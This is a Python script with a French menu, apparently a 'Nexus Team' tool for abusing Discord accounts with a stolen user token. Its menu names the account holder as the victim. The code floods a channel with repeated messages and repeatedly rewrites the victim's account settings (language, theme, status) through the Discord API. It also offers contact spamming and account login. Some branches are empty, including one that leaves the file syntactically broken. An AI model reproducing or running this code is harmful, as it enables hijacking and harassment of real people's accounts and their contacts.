import os
os.system("")

import time
from colorama import init, Fore
import base64
import requests
import random

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

init(autoreset=True)

def effet_texte_doux(texte, couleur=Fore.RED):
    for char in texte:
        print(couleur + char, end='', flush=True)
    print()

def menu():
    cls()
    while True:
        texte_ascii = r"""
                                     ███╗   ██╗ ███████╗  ██╗  ██╗  ██╗   ██╗  ███████╗
                                     ████╗  ██║ ██╔════╝  ╚██╗██╔╝  ██║   ██║  ██╔════╝
                                     ██╔██╗ ██║ █████╗     ╚███╔╝   ██║   ██║  ███████╗
                                     ██║╚██╗██║ ██╔══╝     ██╔██╗   ██║   ██║  ╚════██║
                                     ██║ ╚████║ ███████╗  ██╔╝ ██╗  ╚██████╔╝  ███████║
                                     ╚═╝  ╚═══╝ ╚══════╝  ╚═╝  ╚═╝   ╚═════╝   ╚══════╝
                                                                                        by Nexus Team
        """
        effet_texte_doux(texte_ascii, couleur=Fore.RED)

        print(Fore.CYAN + "[1] Discord (avec token)\n")
        print(Fore.CYAN + "[2] Discord (sans token)\n")
        print(Fore.CYAN + "[3] A Suivre\n")

        choix = input(Fore.YELLOW + "Choisis une option : ")

        if choix == "1":
            cls()
            token = input(Fore.GREEN + "\nEntrez le token à utiliser : ")
            print(Fore.MAGENTA + f"\nToken enregistré  : {token}")
        
            print(Fore.YELLOW + "\nQue voulez-vous faire ?\n")
            print(Fore.CYAN + "[1] Spam le Discord de la victime (load boucle)\n")
            print(Fore.CYAN + "[2] Spam contact de la victume (envoie de msg à chaque contact)\n")
            print(Fore.CYAN + "[3] Se connecter au compte de la victime\n")
            print(Fore.CYAN + "[4] Contrôle _No GUI_\n")
            print(Fore.CYAN + "[0] Retour au menu principal\n")
            action = input(' ')

            
            if action == "1":
                cls()
                try:
                    time2 = int(input(Fore.GREEN + "\nEntrez le nombre de cycles : "))
                    for i in range(time2):
                        discord_inf_load(token)
                        time.sleep(2.5)
                except ValueError:
                    print(Fore.RED + "\nTu dois entrer un nombre !")
                    time.sleep(1)
                return
            elif action == "2":
                idee()
                return
            elif action == "3":
                cls()

            elif action == "4":
                cls()
                print(Fore.YELLOW + "Que voulez-vous faire ?\n")
                print(Fore.CYAN + "[1] Déconnexion boucle vocale\n")
                print(Fore.CYAN + "[2] Bloquer sur une langue\n")
                print(Fore.CYAN + "[3] Envoie de messages\n")
                print(Fore.CYAN + "[0] Retour au menu principal\n")
                action = input(' ')

                if action == "3":
                    cls()
                    channel_id = input(Fore.GREEN + "\nEntrez l'ID du canal : ")
                    message = input(Fore.GREEN + "\nEntrez le message à envoyer : ")
                    msg_nmbr = int(input(Fore.GREEN + "\nEntrez le nombre de messages à envoyer : "))
                    discord_msg_send(token, message, channel_id, msg_nmbr)
                
            
            elif action == "0":
                menu()
            else:
                print(Fore.RED + "\nOption invalide. Réessaie...\n")
                time.sleep(1)

        elif action == "2":
            

def token_start():
    cls()
    user_id = input(Fore.GREEN + "\nEntrez l'ID de l'utilisateur à suivre : ")
    encoded_id = base64.b64encode(user_id.encode()).decode()
    print(Fore.MAGENTA + f"\nDébut du token : {encoded_id}")
    save_token = input(Fore.GREEN + f"\nVoulez-vous sauvegarder le token ? (O/N) : ")
    if save_token.lower() == "o":
        with open("token.txt", "w") as file:
            file.write(f"{user_id} : {encoded_id}")
        print(Fore.MAGENTA + "\nLe début du token a été enregistré dans token.txt")
    input(Fore.YELLOW + "\nAppuie sur Entrée pour revenir au menu...")
    menu()

def idee():
    cls()
    print(Fore.BLUE + "\nFonctionnalité à venir... 🚧")
    input(Fore.YELLOW + "\nAppuie sur Entrée pour revenir au menu...")
    menu()
#### ENVOIE DE MESSAGE ###
def discord_msg_send(token, message, channel_id, nmbr_msg):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
        "content": message
    }
    for _ in range(nmbr_msg):
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200 or response.status_code == 204:
            print(Fore.GREEN + "\nMessage envoyé avec succès !")
        else:
            print(Fore.RED + f"\nErreur lors de l'envoi du message. Code d'erreur : {response.status_code}")
        
### SPAM ###
liste_trfa = ["true", "false"]
liste_langue = ["fr", "en-US", "en-GB", "es-ES", "de", "ja", "ko", "pt-BR", "ru", "zh-CN", "zh-TW"]
liste_theme = ["dark", "light"]
liste_status = ["invisible", "online", "dnd", "idle"]

def discord_inf_load(token):
    raid_langue = random.choice(liste_langue)
    raid_theme = random.choice(liste_theme)
    raid_status = random.choice(liste_status)
    raid_enable = random.choice(liste_trfa)

    url = "https://discord.com/api/v9/users/@me/settings"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
        "locale": raid_langue,
        "theme": raid_theme,
        "status": raid_status,
        "inline_embed_media": True,
        "inline_attachments_media": True,
        "enable_tts_command": False,
        "message_display_compact": False,
        "convert_emoticons": True,
        "stream_notifications_enabled": True,
        "enable_sounds": True,
        "enable_gif_status": True,
        "enable_account_verification_alerts": True,
        "enable_developer_mode": raid_enable,
    }

    response = requests.patch(url, headers=headers, json=data)
    if response.status_code in [200, 204]:
        print(Fore.GREEN + "Paramètres mis à jour.")
    else:
        print(Fore.RED + f"Erreur : {response.status_code}")

def langue_bloque(token, langue):
    url = "https://discord.com/api/v9/users/@me/settings"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
            "locale": langue
    }
     

        
if __name__ == "__main__":
    menu()
    print(Fore.RED + "\nAppuie sur Entrée pour quitter...")
    input()
